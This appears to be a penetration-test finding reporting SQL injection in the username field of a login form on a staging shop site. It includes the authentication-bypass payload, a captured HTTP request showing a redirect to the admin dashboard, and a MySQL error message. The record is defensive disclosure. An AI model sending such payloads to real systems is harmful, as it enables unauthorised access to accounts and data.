title: SQL injection in login form
notes:
SQL injection on the login form (POST /login, parameter username).
Payload ' OR '1'='1' -- - in username with any password logs in as admin.
A single quote in the same parameter returns a MySQL error page.
Tested on staging, no data was modified.

evidence.name: burp-login.txt
evidence.text:
POST /login HTTP/1.1
Host: shop.acme.test
Content-Type: application/x-www-form-urlencoded

username=%27+OR+%271%27%3D%271%27+--+-&password=x

HTTP/1.1 302 Found
Location: /admin/dashboard

evidence.name: error-page.txt
evidence.text: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
